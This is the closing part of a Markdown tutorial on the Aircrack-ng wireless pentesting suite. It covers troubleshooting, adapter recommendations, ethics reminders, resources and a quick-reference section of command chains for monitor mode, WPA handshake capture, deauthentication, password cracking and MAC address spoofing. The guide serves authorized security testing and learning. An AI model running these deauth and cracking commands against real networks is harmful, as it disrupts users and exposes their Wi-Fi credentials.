# Look for 4-way handshake (4 EAPOL packets)

# Try pyrit to verify
pyrit -r capture-01.cap analyze

# Convert to newer format
wpaclean cleaned.cap capture-01.cap
```

#### Cracking too slow

```bash
# Use hashcat instead (GPU acceleration)
hashcat -m 22000 -w 3 hash.hc22000 wordlist.txt

# Use multiple CPU cores
aircrack-ng -p 8 -w wordlist.txt capture.cap

# Use airolib-ng for pre-computation
airolib-ng db --import passwd wordlist.txt
airolib-ng db --import essid essid.txt
airolib-ng db --batch
aircrack-ng -r db capture.cap
```

#### Permission denied errors

```bash
# Run with sudo
sudo <command>

# Or add user to netdev group
sudo usermod -aG netdev $USER
# Logout and login again

# Grant capabilities (alternative to sudo)
sudo setcap cap_net_raw,cap_net_admin=eip /usr/bin/airodump-ng
```

---

## Hardware Recommendations

### USB WiFi Adapters

**Best for Pentesting:**

1. **Alfa AWUS036ACH**
   - Chipset: Realtek RTL8812AU
   - Bands: 2.4GHz + 5GHz
   - Power: High
   - Monitor: Yes
   - Injection: Yes

2. **Alfa AWUS036NHA**
   - Chipset: Atheros AR9271
   - Bands: 2.4GHz
   - Power: High (1000mW)
   - Monitor: Excellent
   - Injection: Excellent

3. **TP-Link TL-WN722N v1** (NOT v2/v3!)
   - Chipset: Atheros AR9271
   - Bands: 2.4GHz
   - Monitor: Yes
   - Injection: Yes
   - Note: Only v1 works well

4. **Panda PAU09**
   - Chipset: Ralink RT5372
   - Bands: 2.4GHz
   - Monitor: Yes
   - Injection: Yes

**Avoid:**
- Broadcom chipsets (poor Linux support)
- TP-Link TL-WN722N v2/v3 (different chipset, doesn't work)
- Most built-in laptop cards

### Internal Cards

**Good options:**
- Intel WiFi cards (some models)
- Atheros-based cards
- Check compatibility first

---

## Best Practices

### Ethical Testing

✅ **DO:**
- Get written authorization before testing
- Stay within defined scope
- Document all activities
- Report findings responsibly
- Use your own test lab for learning

❌ **DON'T:**
- Attack networks without permission
- Exceed authorized scope
- Retain client data unnecessarily
- Test in public spaces without authorization
- Share client credentials

### Operational Security

```bash
# Change MAC address
sudo macchanger -r wlan0mon

# Use VPN for internet traffic
# Use dedicated testing machine
# Don't store sensitive data
# Clean up after testing
```

### Documentation

**Keep records of:**
- Authorization letters
- Testing dates/times
- Commands executed
- Results obtained
- Findings and vulnerabilities
- Remediation recommendations

---

## Resources

### Official Documentation

- **Aircrack-ng Wiki**: https://www.aircrack-ng.org/
- **Documentation**: https://www.aircrack-ng.org/documentation.html
- **GitHub**: https://github.com/aircrack-ng/aircrack-ng

### Learning Resources

**Courses:**
- Offensive Security WiFu (PEN-210)
- SANS SEC617: Wireless Penetration Testing
- eLearnSecurity WAPT

**Books:**
- "Kali Linux Wireless Penetration Testing Beginner's Guide"
- "Advanced Wireless Penetration Testing"
- "Hacking Exposed Wireless"

**Practice Platforms:**
- HackTheBox (WiFi challenges)
- TryHackMe (WiFi rooms)
- PentesterLab

### Tools to Combine

- **Kismet**: Wireless detection
- **Wireshark**: Packet analysis
- **Reaver/Bully**: WPS attacks
- **Hashcat**: GPU cracking
- **Wifite**: Automated attacks
- **Fluxion**: Evil twin automation

---

## Quick Reference

### Common Command Chains

**Monitor mode:**
```bash
sudo airmon-ng check kill && sudo airmon-ng start wlan0
```

**WPA capture:**
```bash
sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon
```

**Deauth:**
```bash
sudo aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX wlan0mon
```

**Crack:**
```bash
sudo aircrack-ng -a 2 -b XX:XX:XX:XX:XX:XX -w wordlist.txt capture-01.cap
```

**Stop monitor:**
```bash
sudo airmon-ng stop wlan0mon && sudo systemctl restart NetworkManager
```

---

## Conclusion

The Aircrack-ng suite is the most comprehensive set of wireless security tools available. Master these tools to:
- Assess wireless network security
- Identify vulnerabilities
- Demonstrate risks to stakeholders
- Improve wireless security posture

**Remember:**
- Always get authorization
- Stay within legal boundaries
- Document everything
- Report responsibly
- Continuous learning

**Legal reminder**: Unauthorized access to computer networks is illegal. Only use these tools on networks you own or have explicit written permission to test.

---

**Last Updated**: 2025
**Version**: 1.0
**License**: Educational Use Only

For professional wireless security assessments, consult qualified security professionals and legal counsel.
